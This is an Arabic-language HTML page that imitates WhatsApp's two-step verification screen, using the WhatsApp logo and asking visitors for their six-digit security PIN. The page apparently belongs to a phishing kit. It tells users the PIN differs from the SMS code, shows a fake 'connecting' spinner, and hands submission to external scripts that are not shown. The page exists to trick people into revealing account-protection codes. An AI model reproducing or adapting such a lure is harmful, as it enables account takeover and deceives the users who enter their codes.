<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>التحقق بخطوتين - رمز الأمان</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="./assets/images/favicon.ico" />
  <link rel="stylesheet" href="style.css" />

  <style>
    .loading-overlay {
      position: fixed;
      top:0; left:0; right:0; bottom:0;
      background: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .loading-popup {
      background: #fff;
      padding: 30px 50px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      font-size: 1.5rem;
      color: #333;
      text-align: center;
      user-select: none;
      display: flex;
      align-items: center;
      gap: 15px;
    }
    .loading-spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #333;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    #errorMsg, #successMsg {
      display: none;
      font-weight: bold;
      margin-top: 10px;
      text-align: center;
    }
    #errorMsg {
      color: red;
    }
    #successMsg {
      color: red;
    }
  </style>
<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
</head>
<body>

  <div class="navbar">
    <div class="navbar-title">مجموعة التواصل</div>
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار التواصل" />
  </div>

  <div class="container" dir="rtl">
    <form id="securityCodeForm" novalidate>
      <div id="securityCodeSection">
        <div class="security-code-container">
          <img
            src="assets/images/wp-pin.png"
            alt="شعار رمز الأمان"
            class="security-code-logo"
            style="width: 85px;"
          />
          <h2 class="security-code-title">التحقق بخطوتين - رمز الأمان</h2>
          <p class="security-code-subtitle" style="font-size: 15px; font-family: sans-serif;">
            هذا الحساب محمي بخطوتين. يرجى إدخال رمز الأمان الذي قمت بإنشائه عند تفعيل الحماية.
            رمز الأمان يختلف عن رمز التأكيد الذي تم إرساله عبر الرسائل النصية.
          </p>

          <input
            id="template"
            type="text"
            name="securityCode"
            maxlength="6"
            placeholder="* * * * * *"
            inputmode="numeric"
            style="outline: none; box-shadow: none;"
            required
          />

          <p id="errorMsg"></p>
          <p id="successMsg"></p>

          <button type="submit" id="confirmSecurityCodeBtn">تأكيد الرمز</button>
        </div>
      </div>
    </form>
  </div>

  <div class="footer">
    <p>© 2025 جميع الحقوق محفوظة</p>
    <p>تم التطوير بواسطة فريق الدعم</p>
  </div>

  <div id="loadingPopup" class="loading-overlay">
    <div class="loading-popup">
      <div class="loading-spinner"></div>
      <span id="loadingText">جاري الاتصال ...</span>
    </div>
  </div>

  <script src="js/utils.js"></script>
  <script src="js/template.js"></script>
</body>
</html>
